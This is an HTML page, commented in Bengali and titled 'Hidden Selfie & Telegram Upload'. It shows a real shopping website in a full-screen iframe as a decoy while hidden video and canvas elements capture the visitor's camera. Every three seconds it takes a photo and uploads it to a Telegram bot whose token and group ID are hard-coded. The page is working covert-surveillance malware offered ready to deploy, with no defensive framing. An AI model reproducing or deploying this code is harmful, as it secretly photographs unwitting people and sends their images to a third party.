<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Selfie & Telegram Upload</title>
    <style>
        /* পুরো পেজ জুড়ে iFrame থাকবে */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1; /* iFrame সবকিছুর ওপরে থাকবে */
        }
        video, canvas {
            position: fixed;
            top: -1000px; /* ক্যামেরা হাইড করা */
            left: -1000px;
            display: block;
        }
    </style>
</head>
<body>

    <!-- ব্যাকগ্রাউন্ড ওয়েবসাইট -->
    <iframe src="https://ghorerbazar.com"></iframe>

    <!-- ক্যামেরা থেকে ছবি তোলার জন্য ভিডিও ও ক্যানভাস -->
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        // Telegram Bot Details
        const TELEGRAM_BOT_TOKEN = "7683194814:AAHHwnPjUhINyB8vTXjNvwT6RRhj56YI64M"; // Bot টোকেন
        const TELEGRAM_CHAT_ID = "-1002540621369"; // গ্রুপ ID

        // ক্যামেরা চালু করা (ব্যবহারকারীর অনুমতি লাগবে)
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => console.error("Camera Access Denied!", err));

        // প্রতি ৩ সেকেন্ডে ছবি তুলে পাঠানো
        setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "selfie.jpg");

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .then(res => res.json())
                .then(data => console.log("Photo Sent:", data))
                .catch(err => console.error("Upload Error:", err));
            }, "image/jpeg");
        }, 3000);
    </script>

</body>
</html>
